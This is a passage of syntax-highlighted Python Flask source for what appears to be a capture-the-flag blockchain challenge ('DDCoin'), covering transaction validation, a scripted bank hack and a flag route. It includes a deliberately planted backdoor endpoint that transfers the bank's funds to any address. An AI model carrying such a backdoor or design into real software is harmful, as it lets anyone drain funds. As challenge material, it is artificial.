utxo\"</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">if</span> utxo<span class=\"token punctuation\">[</span><span class=\"token string\">'id'</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">in</span> new_utxo_ids<span class=\"token punctuation\">:</span> <span class=\"token keyword\">raise</span> Exception<span class=\"token punctuation\">(</span><span class=\"token string\">\"output utxo of same id(&#123;&#125;) already exists.\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>utxo<span class=\"token punctuation\">[</span><span class=\"token string\">'id'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n            new_utxo_ids<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span>utxo<span class=\"token punctuation\">[</span><span class=\"token string\">'id'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">if</span> <span class=\"token builtin\">type</span><span class=\"token punctuation\">(</span>utxo<span class=\"token punctuation\">[</span><span class=\"token string\">'amount'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token builtin\">type</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> <span class=\"token keyword\">raise</span> Exception<span class=\"token punctuation\">(</span><span class=\"token string\">\"unknown type of amount of output utxo\"</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">if</span> utxo<span class=\"token punctuation\">[</span><span class=\"token string\">'amount'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">&lt;=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span> <span class=\"token keyword\">raise</span> Exception<span class=\"token punctuation\">(</span><span class=\"token string\">\"invalid amount of output utxo\"</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">if</span> <span class=\"token builtin\">type</span><span class=\"token punctuation\">(</span>utxo<span class=\"token punctuation\">[</span><span class=\"token string\">'addr'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token builtin\">type</span><span class=\"token punctuation\">(</span><span class=\"token string\">''</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> <span class=\"token keyword\">raise</span> Exception<span class=\"token punctuation\">(</span><span class=\"token string\">\"unknown type of address of output utxo\"</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span>\n                addr_to_pubkey<span class=\"token punctuation\">(</span>utxo<span class=\"token punctuation\">[</span><span class=\"token string\">'addr'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">except</span><span class=\"token punctuation\">:</span>\n                <span class=\"token keyword\">raise</span> Exception<span class=\"token punctuation\">(</span><span class=\"token string\">\"invalid type of address(&#123;&#125;)\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>utxo<span class=\"token punctuation\">[</span><span class=\"token string\">'addr'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n            utxo<span class=\"token punctuation\">[</span><span class=\"token string\">'hash'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> hash_utxo<span class=\"token punctuation\">(</span>utxo<span class=\"token punctuation\">)</span>\n        tot_output <span class=\"token operator\">=</span> <span class=\"token builtin\">sum</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>utxo<span class=\"token punctuation\">[</span><span class=\"token string\">'amount'</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">for</span> utxo <span class=\"token keyword\">in</span> tx<span class=\"token punctuation\">[</span><span class=\"token string\">'output'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n        \n        <span class=\"token keyword\">if</span> <span class=\"token builtin\">type</span><span class=\"token punctuation\">(</span>tx<span class=\"token punctuation\">[</span><span class=\"token string\">'input'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token builtin\">type</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> <span class=\"token keyword\">raise</span> Exception<span class=\"token punctuation\">(</span><span class=\"token string\">\"type of input utxo ids in tx should be array\"</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">if</span> <span class=\"token builtin\">type</span><span class=\"token punctuation\">(</span>tx<span class=\"token punctuation\">[</span><span class=\"token string\">'signature'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token builtin\">type</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> <span class=\"token keyword\">raise</span> Exception<span class=\"token punctuation\">(</span><span class=\"token string\">\"type of input utxo signatures in tx should be array\"</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>tx<span class=\"token punctuation\">[</span><span class=\"token string\">'input'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>tx<span class=\"token punctuation\">[</span><span class=\"token string\">'signature'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> <span class=\"token keyword\">raise</span> Exception<span class=\"token punctuation\">(</span><span class=\"token string\">\"lengths of arrays of ids and signatures of input utxos should be the same\"</span><span class=\"token punctuation\">)</span>\n        tot_input <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n        tx<span class=\"token punctuation\">[</span><span class=\"token string\">'input'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> <span class=\"token builtin\">type</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token builtin\">type</span><span class=\"token punctuation\">(</span><span class=\"token string\">u''</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">else</span> i <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> tx<span class=\"token punctuation\">[</span><span class=\"token string\">'input'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span>\n        tx<span class=\"token punctuation\">[</span><span class=\"token string\">'signature'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> <span class=\"token builtin\">type</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token builtin\">type</span><span class=\"token punctuation\">(</span><span class=\"token string\">u''</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">else</span> i <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> tx<span class=\"token punctuation\">[</span><span class=\"token string\">'signature'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span>\n        <span class=\"token keyword\">for</span> utxo_id<span class=\"token punctuation\">,</span> signature <span class=\"token keyword\">in</span> <span class=\"token builtin\">zip</span><span class=\"token punctuation\">(</span>tx<span class=\"token punctuation\">[</span><span class=\"token string\">'input'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> tx<span class=\"token punctuation\">[</span><span class=\"token string\">'signature'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">if</span> <span class=\"token builtin\">type</span><span class=\"token punctuation\">(</span>utxo_id<span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token builtin\">type</span><span class=\"token punctuation\">(</span><span class=\"token string\">''</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> <span class=\"token keyword\">raise</span> Exception<span class=\"token punctuation\">(</span><span class=\"token string\">\"unknown type of id of input utxo\"</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">if</span> utxo_id <span class=\"token keyword\">not</span> <span class=\"token keyword\">in</span> utxos<span class=\"token punctuation\">:</span> <span class=\"token keyword\">raise</span> Exception<span class=\"token punctuation\">(</span><span class=\"token string\">\"invalid id of input utxo. Input utxo(&#123;&#125;) does not exist or it has been consumed.\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>utxo_id<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n            utxo <span class=\"token operator\">=</span> utxos<span class=\"token punctuation\">[</span>utxo_id<span class=\"token punctuation\">]</span>\n            <span class=\"token keyword\">if</span> <span class=\"token builtin\">type</span><span class=\"token punctuation\">(</span>signature<span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token builtin\">type</span><span class=\"token punctuation\">(</span><span class=\"token string\">''</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> <span class=\"token keyword\">raise</span> Exception<span class=\"token punctuation\">(</span><span class=\"token string\">\"unknown type of signature of input utxo\"</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> verify_utxo_signature<span class=\"token punctuation\">(</span>utxo<span class=\"token punctuation\">[</span><span class=\"token string\">'addr'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> utxo_id<span class=\"token punctuation\">,</span> signature<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n                <span class=\"token keyword\">raise</span> Exception<span class=\"token punctuation\">(</span><span class=\"token string\">\"Signature of input utxo is not valid. You are not the owner of this input utxo(&#123;&#125;)!\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>utxo_id<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n            tot_input <span class=\"token operator\">+=</span> utxo<span class=\"token punctuation\">[</span><span class=\"token string\">'amount'</span><span class=\"token punctuation\">]</span>\n            <span class=\"token keyword\">del</span> utxos<span class=\"token punctuation\">[</span>utxo_id<span class=\"token punctuation\">]</span>\n        <span class=\"token keyword\">if</span> tot_output <span class=\"token operator\">></span> tot_input<span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">raise</span> Exception<span class=\"token punctuation\">(</span><span class=\"token string\">\"You don't have enough amount of DDCoins in the input utxo! &#123;&#125;/&#123;&#125;\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>tot_input<span class=\"token punctuation\">,</span> tot_output<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        tx<span class=\"token punctuation\">[</span><span class=\"token string\">'hash'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> hash_tx<span class=\"token punctuation\">(</span>tx<span class=\"token punctuation\">)</span>\n    \n    block <span class=\"token operator\">=</span> create_block<span class=\"token punctuation\">(</span>block<span class=\"token punctuation\">[</span><span class=\"token string\">'prev'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> block<span class=\"token punctuation\">[</span><span class=\"token string\">'nonce'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> block<span class=\"token punctuation\">[</span><span class=\"token string\">'transactions'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n    block_hash <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>block<span class=\"token punctuation\">[</span><span class=\"token string\">'hash'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">if</span> block_hash <span class=\"token operator\">></span> difficulty<span class=\"token punctuation\">:</span> <span class=\"token keyword\">raise</span> Exception<span class=\"token punctuation\">(</span><span class=\"token string\">'Please provide a valid Proof-of-Work'</span><span class=\"token punctuation\">)</span>\n    block<span class=\"token punctuation\">[</span><span class=\"token string\">'height'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> tail<span class=\"token punctuation\">[</span><span class=\"token string\">'height'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token number\">1</span>\n    <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>session<span class=\"token punctuation\">[</span><span class=\"token string\">'blocks'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token number\">50</span><span class=\"token punctuation\">:</span> <span class=\"token keyword\">raise</span> Exception<span class=\"token punctuation\">(</span><span class=\"token string\">'The blockchain is too long. Use ./reset to reset the blockchain'</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">if</span> block<span class=\"token punctuation\">[</span><span class=\"token string\">'hash'</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">in</span> session<span class=\"token punctuation\">[</span><span class=\"token string\">'blocks'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span> <span class=\"token keyword\">raise</span> Exception<span class=\"token punctuation\">(</span><span class=\"token string\">'A same block is already in the blockchain'</span><span class=\"token punctuation\">)</span>\n    session<span class=\"token punctuation\">[</span><span class=\"token string\">'blocks'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>block<span class=\"token punctuation\">[</span><span class=\"token string\">'hash'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> block\n    session<span class=\"token punctuation\">.</span>modified <span class=\"token operator\">=</span> <span class=\"token boolean\">True</span>\n    \n<span class=\"token keyword\">def</span> <span class=\"token function\">init</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> <span class=\"token string\">'blocks'</span> <span class=\"token keyword\">not</span> <span class=\"token keyword\">in</span> session<span class=\"token punctuation\">:</span>\n        session<span class=\"token punctuation\">[</span><span class=\"token string\">'blocks'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span>\n        session<span class=\"token punctuation\">[</span><span class=\"token string\">'your_diamonds'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n    \n        <span class=\"token comment\"># First, the bank issued some DDCoins ...</span>\n        total_currency_issued <span class=\"token operator\">=</span> create_output_utxo<span class=\"token punctuation\">(</span>bank_address<span class=\"token punctuation\">,</span> <span class=\"token number\">1000000</span><span class=\"token punctuation\">)</span>\n        genesis_transaction <span class=\"token operator\">=</span> create_tx<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span>total_currency_issued<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># create DDCoins from nothing</span>\n        genesis_block <span class=\"token operator\">=</span> create_block<span class=\"token punctuation\">(</span>EMPTY_HASH<span class=\"token punctuation\">,</span> <span class=\"token string\">'The Times 03/Jan/2009 Chancellor on brink of second bailout for bank'</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span>genesis_transaction<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n        session<span class=\"token punctuation\">[</span><span class=\"token string\">'genesis_block_hash'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> genesis_block<span class=\"token punctuation\">[</span><span class=\"token string\">'hash'</span><span class=\"token punctuation\">]</span>\n        genesis_block<span class=\"token punctuation\">[</span><span class=\"token string\">'height'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n        session<span class=\"token punctuation\">[</span><span class=\"token string\">'blocks'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>genesis_block<span class=\"token punctuation\">[</span><span class=\"token string\">'hash'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> genesis_block\n        \n        <span class=\"token comment\"># Then, the bank was hacked by the hacker ...</span>\n        handout <span class=\"token operator\">=</span> create_output_utxo<span class=\"token punctuation\">(</span>hacker_address<span class=\"token punctuation\">,</span> <span class=\"token number\">999999</span><span class=\"token punctuation\">)</span>\n        reserved <span class=\"token operator\">=</span> create_output_utxo<span class=\"token punctuation\">(</span>bank_address<span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n        transferred <span class=\"token operator\">=</span> create_tx<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>total_currency_issued<span class=\"token punctuation\">[</span><span class=\"token string\">'id'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span>handout<span class=\"token punctuation\">,</span> reserved<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> bank_privkey<span class=\"token punctuation\">)</span>\n        second_block <span class=\"token operator\">=</span> create_block<span class=\"token punctuation\">(</span>genesis_block<span class=\"token punctuation\">[</span><span class=\"token string\">'hash'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'HAHA, I AM THE BANK NOW!'</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span>transferred<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n        append_block<span class=\"token punctuation\">(</span>second_block<span class=\"token punctuation\">)</span>\n        \n        <span class=\"token comment\"># Can you buy 2 diamonds using all DDCoins?</span>\n        third_block <span class=\"token operator\">=</span> create_block<span class=\"token punctuation\">(</span>second_block<span class=\"token punctuation\">[</span><span class=\"token string\">'hash'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'a empty block'</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n        append_block<span class=\"token punctuation\">(</span>third_block<span class=\"token punctuation\">)</span>\n        \n<span class=\"token keyword\">def</span> <span class=\"token function\">get_balance_of_all</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    init<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    tail <span class=\"token operator\">=</span> find_blockchain_tail<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    utxos <span class=\"token operator\">=</span> calculate_utxo<span class=\"token punctuation\">(</span>tail<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> calculate_balance<span class=\"token punctuation\">(</span>utxos<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> utxos<span class=\"token punctuation\">,</span> tail\n    \n<span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span>url_prefix<span class=\"token operator\">+</span><span class=\"token string\">'/'</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">homepage</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    announcement <span class=\"token operator\">=</span> <span class=\"token string\">'Announcement: The server has been restarted at 21:45 04/17. All blockchain have been reset. '</span>\n    balance<span class=\"token punctuation\">,</span> utxos<span class=\"token punctuation\">,</span> _ <span class=\"token operator\">=</span> get_balance_of_all<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    genesis_block_info <span class=\"token operator\">=</span> <span class=\"token string\">'hash of genesis block: '</span> <span class=\"token operator\">+</span> session<span class=\"token punctuation\">[</span><span class=\"token string\">'genesis_block_hash'</span><span class=\"token punctuation\">]</span>\n    addr_info <span class=\"token operator\">=</span> <span class=\"token string\">'the bank\\'s addr: '</span> <span class=\"token operator\">+</span> bank_address <span class=\"token operator\">+</span> <span class=\"token string\">', the hacker\\'s addr: '</span> <span class=\"token operator\">+</span> hacker_address <span class=\"token operator\">+</span> <span class=\"token string\">', the shop\\'s addr: '</span> <span class=\"token operator\">+</span> shop_address\n    balance_info <span class=\"token operator\">=</span> <span class=\"token string\">'Balance of all addresses: '</span> <span class=\"token operator\">+</span> json<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span>balance<span class=\"token punctuation\">)</span>\n    utxo_info <span class=\"token operator\">=</span> <span class=\"token string\">'All utxos: '</span> <span class=\"token operator\">+</span> json<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span>utxos<span class=\"token punctuation\">)</span>\n    blockchain_info <span class=\"token operator\">=</span> <span class=\"token string\">'Blockchain Explorer: '</span> <span class=\"token operator\">+</span> json<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span>session<span class=\"token punctuation\">[</span><span class=\"token string\">'blocks'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n    view_source_code_link <span class=\"token operator\">=</span> <span class=\"token string\">\"&lt;a href='source_code'>View source code&lt;/a>\"</span>\n    <span class=\"token keyword\">return</span> announcement<span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;br />&lt;br />\\r\\n\\r\\n'</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>view_source_code_link<span class=\"token punctuation\">,</span> genesis_block_info<span class=\"token punctuation\">,</span> addr_info<span class=\"token punctuation\">,</span> balance_info<span class=\"token punctuation\">,</span> utxo_info<span class=\"token punctuation\">,</span> blockchain_info<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    \n    \n<span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span>url_prefix<span class=\"token operator\">+</span><span class=\"token string\">'/flag'</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">getFlag</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    init<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">if</span> session<span class=\"token punctuation\">[</span><span class=\"token string\">'your_diamonds'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">>=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span> <span class=\"token keyword\">return</span> FLAG<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> <span class=\"token string\">'To get the flag, you should buy 2 diamonds from the shop. You have &#123;&#125; diamonds now. To buy a diamond, transfer 1000000 DDCoins to '</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>session<span class=\"token punctuation\">[</span><span class=\"token string\">'your_diamonds'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> shop_address\n    \n<span class=\"token keyword\">def</span> <span class=\"token function\">find_enough_utxos</span><span class=\"token punctuation\">(</span>utxos<span class=\"token punctuation\">,</span> addr_from<span class=\"token punctuation\">,</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    collected <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\n    <span class=\"token keyword\">for</span> utxo <span class=\"token keyword\">in</span> utxos<span class=\"token punctuation\">.</span>values<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">if</span> utxo<span class=\"token punctuation\">[</span><span class=\"token string\">'addr'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> addr_from<span class=\"token punctuation\">:</span>\n            amount <span class=\"token operator\">-=</span> utxo<span class=\"token punctuation\">[</span><span class=\"token string\">'amount'</span><span class=\"token punctuation\">]</span>\n            collected<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>utxo<span class=\"token punctuation\">[</span><span class=\"token string\">'id'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">if</span> amount <span class=\"token operator\">&lt;=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span> <span class=\"token keyword\">return</span> collected<span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span>amount\n    <span class=\"token keyword\">raise</span> Exception<span class=\"token punctuation\">(</span><span class=\"token string\">'no enough DDCoins in '</span> <span class=\"token operator\">+</span> addr_from<span class=\"token punctuation\">)</span>\n    \n<span class=\"token keyword\">def</span> <span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span>utxos<span class=\"token punctuation\">,</span> addr_from<span class=\"token punctuation\">,</span> addr_to<span class=\"token punctuation\">,</span> amount<span class=\"token punctuation\">,</span> privkey<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    input_utxo_ids<span class=\"token punctuation\">,</span> the_change <span class=\"token operator\">=</span> find_enough_utxos<span class=\"token punctuation\">(</span>utxos<span class=\"token punctuation\">,</span> addr_from<span class=\"token punctuation\">,</span> amount<span class=\"token punctuation\">)</span>\n    outputs <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>create_output_utxo<span class=\"token punctuation\">(</span>addr_to<span class=\"token punctuation\">,</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span>\n    <span class=\"token keyword\">if</span> the_change <span class=\"token operator\">!=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span>\n        outputs<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>create_output_utxo<span class=\"token punctuation\">(</span>addr_from<span class=\"token punctuation\">,</span> the_change<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> create_tx<span class=\"token punctuation\">(</span>input_utxo_ids<span class=\"token punctuation\">,</span> outputs<span class=\"token punctuation\">,</span> privkey<span class=\"token punctuation\">)</span>\n    \n<span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span>url_prefix<span class=\"token operator\">+</span><span class=\"token string\">'/5ecr3t_free_D1diCoin_b@ckD00r/&lt;string:address>'</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">free_ddcoin</span><span class=\"token punctuation\">(</span>address<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    balance<span class=\"token punctuation\">,</span> utxos<span class=\"token punctuation\">,</span> tail <span class=\"token operator\">=</span> get_balance_of_all<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">if</span> balance<span class=\"token punctuation\">[</span>bank_address<span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span> <span class=\"token keyword\">return</span> <span class=\"token string\">'The bank has no money now.'</span>\n    <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span>\n        address <span class=\"token operator\">=</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>address<span class=\"token punctuation\">)</span>\n        addr_to_pubkey<span class=\"token punctuation\">(</span>address<span class=\"token punctuation\">)</span> <span class=\"token comment\"># to check if it is a valid address</span>\n        transferred <span class=\"token operator\">=</span> transfer<span class=\"token punctuation\">(</span>utxos<span class=\"token punctuation\">,</span> bank_address<span class=\"token punctuation\">,</span> address<span class=\"token punctuation\">,</span> balance<span class=\"token punctuation\">[</span>bank_address<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> bank_privkey<span class=\"token punctuation\">)</span>\n        new_block <span class=\"token operator\">=</span> create_block<span class=\"token punctuation\">(</span>tail<span class=\"token punctuation\">[</span><span class=\"token string\">'hash'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'b@cKd00R tr1993ReD'</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span>transferred<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n        append_block<span class=\"token punctuation\">(</span>new_block<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">return</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>balance<span class=\"token punctuation\">[</span>bank_address<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">' DDCoins are successfully sent to '</span> <span class=\"token operator\">+</span> address\n    <span class=\"token keyword\">except</span> Exception<span class=\"token punctuation\">,</span>e<span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> <span class=\"token string\">'ERROR: '</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span>\n\nDIFFICULTY <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token string\">'00000'</span> <span class=\"token operator\">+</span> <span class=\"token string\">'f'</span> <span class=\"token operator\">*</span> <span class=\"token number\">59</span><span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span>\n<span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span>url_prefix<span class=\"token operator\">+</span><span class=\"token string\">'/create_transaction'</span><span class=\"token punctuation\">,</span> methods<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token string\">'POST'</span><span class=\"token punctuation\">]</span><span class=\"token 